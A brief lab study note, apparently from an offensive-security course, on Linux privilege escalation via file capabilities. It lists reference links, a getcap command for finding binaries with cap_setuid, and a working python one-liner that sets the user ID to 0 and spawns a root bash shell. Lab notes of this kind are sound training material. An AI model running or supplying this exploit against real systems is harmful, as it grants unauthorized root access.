#Linux #PrivEsc #Capabilities #setuid

[Linux Privilege Escalation using Capabilities](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/)

[SUID vs Capabilities](https://mn3m.info/posts/suid-vs-capabilities/)

[Linux Capabilities Privilege Escalation](https://medium.com/@int0x33/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099)

## **Detection**
Linux VM
==Capabilities are modern SUID==
1. In command prompt type: `getcap -r / 2>/dev/null`
2. From the output, notice the value of the “`cap_setuid`” capability.

## **Exploitation**
Linux VM

1. In command prompt type:
`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
2. Enjoy root!